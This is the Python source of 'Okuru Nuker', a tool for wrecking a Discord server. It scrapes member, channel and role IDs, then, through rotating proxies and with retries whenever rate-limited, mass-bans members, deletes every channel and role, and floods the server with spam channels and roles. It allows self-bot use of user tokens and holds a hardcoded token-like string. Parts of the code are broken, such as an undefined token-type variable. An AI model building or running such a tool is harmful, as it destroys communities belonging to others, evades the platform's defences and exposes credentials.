import requests
import os
import threading, time
import discord
from discord.ext import commands
from colorama import Fore
from itertools import cycle

if os.name == 'nt':
	os.system(f'mode 99,29')
	os.system(f'title [Okuru Nuker] - Loading Proxies')

def versionCheck():
    if discord.__version__ != '1.4.0':
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;15m Installing discord.py 1.4\033[37m...\n')
        os.system('pip install discord.py==1.4 > nul')
        clear()
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;15m Successfully Installed.')
        time.sleep(2)
        os._exit(0)

#versionCheck()
proxies = []
members = open('Scraped/members.okuru')
channels = open('Scraped/channels.okuru')
roles = open('Scraped/roles.okuru')

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

for line in open('proxies.okuru'):
    proxies.append(line.replace('\n', ''))

print(f'{Fore.LIGHTBLUE_EX}[INFO] \u001b[38;5;253mFinished Loading Proxies')
time.sleep(1)
clear()

proxs = cycle(proxies)
clear()
token = 'ODE1MjU4NzA4OTEyMjQyNzE4.YDpy1g.uWk9ofjQ8duQ3I1ltDE5kg4bVbg'
token = input(f'\u001b[38;5;21m[?]\u001b[38;5;15m Token: ')

guild = input(f'\u001b[38;5;21m[?]\u001b[38;5;15m Guild ID: ')

prefix = input(f'\u001b[38;5;21m[?]\u001b[38;5;15m Prefix: ')

clear()



if requests.get('https://discord.com/api/v8/users/@me', headers={"Authorization": token}).status_code == 200:
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix,
                          case_insensitive=False,
                          self_bot=True)
else:
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False)



def ban(i):
    r = requests.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{i}/?delete-message-days=7&reason=Okuru%20Nuker%20%20=>%20MassBan', proxies={"http": 'http://' + next(proxs)}, headers=headers)
    if r.status_code == 429:
        print(f"\u001b[38;5;196m[MassBan]\u001b[38;5;253m => Proxy Limited For {r.json()['retry_after']}")
        ban(i)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f'{Fore.LIGHTGREEN_EX}[Massban]\u001b[38;5;253m => Banned {i}')


def chandel(u):
    r = requests.delete(f'https://discord.com/api/v8/channels/{u}', proxies={"http": 'http://' + next(proxs)}, headers=headers)
    if r.status_code == 429:
        print(f"\u001b[38;5;196m[ChannelDeletion]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
        chandel(u)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f'{Fore.LIGHTGREEN_EX}[ChannelDeletion]\u001b[38;5;253m => Deleted => {u}')


def roledel(k):
    r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{k}', proxies={"http": 'http://' + next(proxs)}, headers=headers)
    if r.status_code == 429:
        print(f"\u001b[38;5;196m[RoleDeletion]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
        roledel(k)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f'{Fore.LIGHTGREEN_EX}[RoleDeletion]\u001b[38;5;253m => Deleted {k}')


def spamchannel(name):
    json = {'name': name, 'type': 0}
    r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', proxies={"http": 'http://' + next(proxs)}, headers=headers, json=json)
    if r.status_code == 429:
        print(f"\u001b[38;5;196m[ChannelSpam]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
        spamchannel(name)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f'{Fore.LIGHTGREEN_EX}[ChannelSpam]\u001b[38;5;253m => Created {name}')


def spamrole(role):
    json = {'name': role, 'type': 0}
    r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', proxies={"http": 'http://' + next(proxs)}, headers=headers, json=json)
    if r.status_code == 429:
        print(f"\u001b[38;5;196m[RoleSpam]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
        spamrole(role)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f'{Fore.LIGHTGREEN_EX}[RoleSpam]\u001b[38;5;253m => Created {role}')


def nukecmd():
  print(f'\u001b[38;5;21m[?]\u001b[38;5;15m Ready To Nuke Server;\n')
  name = input('\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names: ')
  amount = input('\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Channels: ')
  role = input(f'\u001b[38;5;21m[?]\u001b[38;5;15m Role Names: ')
  amount = input(f'\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Roles: ')
  clear()
  print(f'\u001b[38;5;21m[?]\u001b[38;5;15m Nuking Server...')
  for m in members:
    threading.Thread(target=ban, args=(m, )).start()
  for c in channels:
    threading.Thread(target=chandel, args=(c, )).start()
  for r in roles:
    threading.Thread(target=roledel, args=(r, )).start()
  for i in range(int(amount)):
    threading.Thread(target=spamchannel, args=(name, )).start()
  for i in range(int(amount)):
    threading.Thread(target=spamrole, args=(role, )).start()
  input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')

os.system(f'title [Okuru Nuker] - Menu')

def menu():
    clear()
    print(f'''
				\u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
				\u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║  ║║║║ ║╠╩╗║╣ ╠╦╝
				\u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m 
                              
			[+]═════════════════════[+]═══════════════════[+]
			 ║ \u001b[38;5;27m[1] - Ban Members     ║ \u001b[38;5;27m[5] - Spam Roles    ║
			 ║ \u001b[38;5;26m[2] - Del Channels    ║ \u001b[38;5;26m[6] - Nuke Server   ║
			 ║ \u001b[38;5;25m[3] - Del Roles       ║ \u001b[38;5;25m[7] - Credits       ║
			 ║ \u001b[38;5;24m[4] - Spam Channels   ║ \u001b[38;5;24m[8] - Scrape        ║
			[+]═════════════════════[+]═══════════════════[+]

			\u001b[38;5;33m'''.center(os.get_terminal_size().columns))

    choice = int(input('[ > ] '))
    clear()
    if choice == 1:
        os.system('title [Okuru Nuker] - Banning members')
        print('[OKURU:INFO] Starting to Ban Members')
        for m in members:
            threading.Thread(target=ban, args=(m, )).start()
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
        clear()

    elif choice == 2:
        os.system('title [Okuru Nuker] - Deleting Channels')
        print('[OKURU:INFO] Starting to Delete Channels')
        for c in channels:
            threading.Thread(target=chandel, args=(c, )).start()
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
        clear()

    elif choice == 3:
        os.system('title [Okuru Nuker] - Deleting Roles')
        print('[OKURU:INFO] Starting to Delete Roles')
        for r in roles:
            threading.Thread(target=roledel, args=(r, )).start()
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
        clear()

    elif choice == 4:
        os.system('title [Okuru Nuker] - Create Channels')
        print('[OKURU:INFO] Starting to Create Channels')
        print()
        name = input('\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names: ')
        amount = input('\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ')
        for i in range(int(amount)):
            threading.Thread(target=spamchannel, args=(name, )).start()
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
        clear()

    elif choice == 5:
        os.system(f'title [Okuru Nuker] - Create Channels')
        print('[OKURU:INFO] Starting to Create Roles\n')
        role = input('\u001b[38;5;21m[?]\u001b[38;5;15m Role Names: ')
        amount = input('\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ')
        for i in range(int(amount)):
            threading.Thread(target=spamrole, args=(role,)).start()
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
        clear()

    elif choice == 6:
      os.system(f'title [Okuru Nuker] - Nuking')
      nukecmd()
    elif choice == 7:
        print('\u001b[38;5;21m[?]\u001b[38;5;15m This Nuker was made by ; Gowixx, Yum, Aced.')
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
    elif choice == 8:
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;7m Type \u001b[38;5;12m{prefix}scrape \u001b[38;5;7min any channel of the server.')
    else:
        input('Invalid Choice!')
        menu()

@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    try:
        os.remove('Scraped/members.okuru')
        os.remove('Scraped/channels.okuru')
        os.remove('Scraped/roles.okuru')
    except:
        pass
    membercount = 0
    with open('Scraped/members.okuru', 'a') as f:
        for member in ctx.guild.members:
            f.write(str(member.id) + '\n')
            membercount += 1
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{membercount}\033[37m Members')

    channelcount = 0
    with open('Scraped/channels.okuru', 'a') as f:
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + '\n')
            channelcount += 1
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{channelcount}\033[37m Channels')

    rolecount = 0
    with open('Scraped/roles.okuru', 'a') as f:
        for role in ctx.guild.roles:
            f.write(str(role.id) + '\n')
            rolecount += 1
        print(f'\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{rolecount}\033[37m Roles')

    time.sleep(2)
    await menu()


@client.event
async def on_ready():
    if token_type == 'bot':
        menu()


@client.event
async def on_connect():
    if token_type == 'user':
        menu()

def Startup():
    clear()
    try:
        if token_type == 'user':
            clear()
            client.run(token, bot=False)
        elif token_type == 'bot':
            client.run(token)
    except:
        print(f'{Fore.RED}[?]\u001b[38;5;253m Invalid Token Or Rate Limited.')
        input('\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n')
if __name__ == '__main__':
    while True:
        Startup()
